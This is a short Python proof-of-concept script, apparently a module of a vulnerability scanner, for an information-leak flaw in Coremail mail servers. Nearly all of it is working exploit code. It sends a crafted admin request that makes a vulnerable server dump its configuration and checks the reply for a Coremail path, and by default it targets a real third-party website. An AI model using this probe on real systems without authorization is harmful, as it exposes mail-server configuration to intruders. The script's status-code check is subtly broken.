#!/usr/bin/env python3

'''
name: 论客邮箱信息泄露漏洞
author: Anonymousdescription: 论客邮箱信息泄露漏洞
'''

from app.lib.utils.request import request

class Coremail_Information_Leak_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0"
        }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            req = request.get(self.url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/", headers = self.headers)
            if req.status_code != '404' and '/home/coremail' in req.text:
                print('存在论客邮箱信息泄露漏洞')
                return True
            else:
                print('不存在论客邮箱信息泄露漏洞')
                return False
        except Exception as e:
            print(e)
            print('不存在论客邮箱信息泄露漏洞')
            return False
        finally:
            pass

if  __name__ == "__main__":
    Coremail_Information_Leak = Coremail_Information_Leak_BaseVerify('http://www.baidu.com')
    Coremail_Information_Leak.run()
